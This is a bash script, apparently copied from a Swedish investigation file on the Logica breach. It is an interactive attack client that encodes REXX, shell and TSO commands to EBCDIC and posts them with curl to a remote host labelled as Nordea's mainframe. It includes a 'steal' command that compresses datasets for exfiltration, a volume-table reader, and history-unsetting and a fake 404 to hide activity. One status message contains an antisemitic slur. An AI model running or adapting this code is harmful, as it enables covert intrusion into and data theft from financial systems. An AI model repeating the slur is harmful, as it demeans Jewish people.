#!/bin/bash
#from Logica Breach Investigation
#File: fup_tillaggsprotokoll_20130418.pdf
#Notes: Appears to assemble a file {rexx stuff}



#h="IP-adress annan stordator"
h="IP-address Nordea"


ua="Mozilla/5.0 (Windows NT 5.1; x86) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.168 Safari/535.19"
dh="UT"

while :; do

echo -n " $dh 8===D  "
read cmdline
echo " << $cmdline"
if [ -z "$cmdline" ]; then
	echo "... FIN"
	exit 0
fi

verb=`echo "$cmdline"|cut -d' ' -f1`
arg=`echo "$cmdline"|cut -d' ' -f2-`
cmd=""
pro=""
post=""
tgt=""

if [ "$verb" = "rx" ]; then
	echo ":pPPpP REXX ROXX" >&2
	pro=" echo '/* REXX */' > /tmp/rx; echo '' >> /tmp/rx;chmod 755 /tmp/rx;";
	post=" rm -f /tmp/rx ";
	tgt=""
	cmd="$arg"
fi

if [ "$verb" = "rxout" ]; then
	echo ":pPPpP REXX REXX OUT" >&2
fi

if [ "$verb" = "rxin" ]; then
	echo ":pPPP REXXOPHiLE" >&2
	echo " [ $arg ] "
	inputile=`echo "$arg"|cut -d' ' -f1`
	rest=`echo "$arg"|cut -d' ' -f2-`
	cmd=`(echo -n "PARMS='${rest}';"; cat $inputfile)`
	pro="echo '/* REXX */' > /tmp/rx; echo 'l=\"\"; say \"ok\";exit 0; ' >> /tmp/rx; chmod 755 /tmp/rx; cat /tmp/rx;";
	tgt =""
fi

if [ "$verb" = "rxinout" ]; then
	echo ":pPPP REXXOPHiLE" >&2
	echo " [ $arg ] "
	inputfile=`echo "$arg"|cut -d' ' -f1`
	rest=`echo "$arg"|cut -d' ' -f2-`
	cmd=`(echo -n "PARMS='${rest}';"; cat $inputfile)`
	pro="";
	tgt=""
fi

if [ "$verb" = "sh" ]; then
	echo ":pPppPP SHELL SHOCK" >&2
	tgt="/bin/sh"
	cmd="$arg"
fi

if [ "$verb" = "shin" ]; then
	echo ":PppPPP PHILE SHOCK" >&2
	echo " [ $arg ] "
	inputfile=`echo "$arg"|cut -d' ' -f1`
	cmd=$(cat $inputfile|sed 's/\x0d//g')
fi

if [ "$verb" = "steal" ]; then
	echo ":PpppPP SHYLOCK THE JEWISH THIEF STEALiNG TO g1" >&2
	cmd="rm -fr /tmp/sl/$arg/; cat \"//'$arg'\" | compress -c > /tmp/sl/$arg.raw.z;"
	#[SoF] I think the above line had a bug I added the double quotes at the end of the line
	tgt=""
	echo " [ $cmd ] "
fi

if [ "$verb" = "vol" ]; then
	echo ":PppPPp VOLUMNE GOES TO 11" >&2
	pro="echo '/*REXX */' > /tmp/rx; echo 'address syscall \" read 0 s 4096\"';"
	tgt=" "
	cmd="${cmd}address tso \"allocate ddname(sysprint) sysout\"; address tso \"allocate ddname(sysin) dummy\"; "
	for vol in $arg ; do
		cmd="${cmd}address tso \"allocate dsname('FORMAT4.DSCB') DDNAME(SYSLIB) SHR UNIT(3390) VOLUMNE(${vol}) KEYLEN\(44) DSORG(DA) EROPT(ACC)\";"
		cmd="${cmd}address tso \"TSOEXEC CALL *(AMASPZAP)\"; address tso \"REPRO INFILE(SYSLIB) OUTFILE(outdd)\";"
	done
	echo "[ $cmd ]"
fi

if [ "$verb" = "tso" ]; then
	echo ":PppPP TSLOw SHOCK" >&2
	cmd=`echo "$arg"|sed 's/;/\n/g'`
fi

echo '>> go go go '

enccmd=`echo -n "$cmd"|iconv -c -f us-ascii -t ibm-1047|xxd -ps|while read l; do echo -n "$l"; done `

body="l=$( echo -n \"{$enccmd}\"|sed 's/\([0-9a-f][0-9a-f]\)/\\\\x\1/g'|sed 's/\\\\x25/\\\\x15/g' ); printf \$l|HOME=/tmp exec $tgt"

pro="exec 2>&1; unset HISTORY; unset HISTFILE; echo 'status: 404 multifail'; echo 'content-type: text/plain'; echo'';${pro}"

post="; ${post}; exit 1;"

curl --data "$pro $body $post" -v -A "$ua" --url http://${h}/

done

